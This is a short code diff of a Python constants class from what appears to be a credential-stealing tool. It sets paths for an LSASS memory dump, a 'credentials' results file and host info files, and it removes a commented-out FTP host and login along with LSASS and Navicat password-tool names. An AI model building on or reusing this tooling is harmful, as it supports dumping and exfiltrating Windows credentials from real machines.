@@ -11,11 +11,7 @@ tmp = tempfile.gettempdir()
 date = time.strftime("%d%m%Y_%H%M%S") + ".tmp"
 
 class constant():
-    # ftp_host  = '119.29.205.214'
-    # ftp_password = 'e7t65s'
-    # ftp_username = 'test1'
-    lsass_name = "lsass.exe"
-    Navicat = 'navicatpwd.exe'
+
     upload_dir = tempfile.gettempdir() + os.sep + date
     dump_name = upload_dir + os.sep + "lsass.dmp"
     cmdlist = [
@@ -31,8 +27,8 @@ class constant():
     user = getpass.getuser()
     temp_ = str((random.randrange(100,500,3)))
     tmp_name = upload_dir + os.sep + "update.log"
-    tmp_name_ = upload_dir + os.sep + "file_list.txt"
-    tmp_name__ = upload_dir + os.sep + "os_version.txt"
+    tmp_name_ = upload_dir + os.sep + "drive.txt"
+    tmp_name__ = upload_dir + os.sep + "host.txt"
     file_name_results = 'credentials_{current_time}'.format(
         current_time=date
     )  # The extension is added depending on the user output choice
